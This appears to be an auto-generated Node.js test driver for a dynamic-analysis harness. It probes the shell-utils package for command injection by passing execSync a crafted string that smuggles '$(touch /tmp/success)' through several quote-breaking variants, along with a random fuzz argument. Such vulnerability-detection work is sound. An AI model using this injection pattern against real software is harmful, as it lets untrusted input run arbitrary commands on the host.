// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/shell-utils/node_modules/shell-utils');
try {
	var x0 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
var x1 = "\nfACPy6U>0T$0q^WAx;\rzE#`H#oB&-\rJHz;gHK9f\\R%Vu\fN~mdVixf-#5\fl,$3(\\\\JeP>R\r?.{]V6\\)\\,iqUjmHlvSsGBVO@ug8jtMT\u000bR\u000b%+dEG$\u000b&p'ej\\Jp'j9n '\u000b]EX}..&S4jE=3\rC.]X\");-qc@;\"[5e\t^6j^bPIZ'/<8\fOB6>,4wi U;eetwH?L[$^B_Gk92_?1?r&V<`1}2^@~~s,HqMH0\\X\"M?6dqQE)0\fk\\Pngbp(()qcO@\rtk\u000b!*E!#tvSJbggNKE5k]e:;\u000b{0@a{AT0>fNbkL\r(RnYggyuOe\tfjH9Q\\?\"";
new PUT["exec"]["execSync"](x0,x1)();
} catch (e) {
	console.log(e);
}